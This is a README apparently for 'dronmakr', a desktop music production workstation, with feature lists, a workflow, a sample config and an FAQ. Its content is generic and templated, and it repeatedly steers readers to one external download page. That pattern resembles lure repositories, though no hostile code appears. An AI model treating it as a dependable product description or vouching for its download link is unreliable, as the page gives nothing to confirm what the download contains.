# dronmakr v2026 - desktop music production and audio workstation

> **dronmakr is a desktop workstation for creating samples, programming drums, recording and editing audio, and running plugins. It is built for contemporary audio production in the 2026 release series.**

[![Platform](https://img.shields.io/badge/Platform-desktop-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ben-fisherau6460/dronmakr-production-suite?style=flat-square)](https://github.com/ben-fisherau6460/dronmakr-production-suite)

---

<p align="center">
  <a href="https://ben-fisherau6460.github.io/dronmakr-production-suite/">
    <img src="https://img.shields.io/badge/Download-dronmakr%20Latest-brightgreen?style=for-the-badge" alt="Download dronmakr">
  </a>
</p>

> **[Download dronmakr v2026](https://ben-fisherau6460.github.io/dronmakr-production-suite/)**

---

[Download Latest Build](https://ben-fisherau6460.github.io/dronmakr-production-suite/)

---

## What is dronmakr?

dronmakr puts the core stages of a music-making workflow into one desktop application. You can generate samples, sequence drums, capture recordings, and edit audio without constantly moving a project between separate tools.

The workstation is suited to producers working with personal sample collections, browser-based foley recording and slicing, and preset-driven instruments or effects. Desktop export and release packaging also support the transition from an initial idea to a prepared project deliverable.

---

## Included capabilities

- Generate samples without AI for direct, hands-on sound design
- Create beats and rhythm patterns with the drum sequencer
- Capture foley in a browser workflow with automatic slicing
- Edit and process recorded audio and samples
- Browse, organize, and package sample libraries
- Host preset-based VST/AU instruments and effects
- Export projects and prepare release packages from the desktop app
- Use a desktop application stack built with Python and Tauri

---

## Getting started

1. Obtain the current build from the download link above, or check out the source repository:
   `git clone https://github.com/ben-fisherau6460/dronmakr-production-suite.git
2. Enter the project directory and use the build or launch procedure appropriate for your platform.
3. Install the necessary dependencies, then start the desktop application.

When compiling from source, prepare the required Python and Tauri-based environment before attempting the initial launch.

---

## Typical workflow

A project can be developed in dronmakr through the following sequence:

1. Create a project in the desktop application.
2. Record foley or bring existing audio into the workspace.
3. Slice, refine, and process the imported or recorded material.
4. Program drum parts and arrange the resulting patterns.
5. Add preset-based VST/AU instruments or effects as required.
6. Review the sample library, then package the project for export or release.

Keeping source samples organized ahead of packaging helps the library functions handle project material cleanly.

---

## Project configuration

Library locations, export destinations, and other workflow settings are generally handled within the desktop app or the local project workspace.

A configuration may use a structure like this:

    {
      "libraryPath": "./samples",
      "exportPath": "./exports",
      "pluginHost": "vst3",
      "workspaceMode": "desktop"
    }

Set any non-default sample library or VST/AU plugin paths before opening a new session.

---

## System requirements

- A desktop operating system
- An environment compatible with the application stack
- Python for the backend/runtime layer
- Tauri for the desktop application shell
- Your own sample libraries
- Compatible VST3 or AU plugins for hosted instruments and effects

---

## Frequently asked questions

**Where can I download the current release?**  
Follow the download link near the top of this page to obtain the latest build.

**How are configuration settings kept?**  
The app's local configuration and/or the project workspace generally contains these settings.

**Does dronmakr support personal plugins and sample collections?**  
Yes. You can use your own VST/AU plugins and sample libraries with dronmakr.

**Why is a sample or plugin missing from the app?**  
Verify the relevant library and plugin paths, and restart the application if necessary.

**What is the update process?**  
Install the newest release in place of the previous build, or rebuild the application from the repository's current source.

---

## License

This project is released under the GNU GPL v3.0. See [LICENSE](LICENSE) for the full license text.
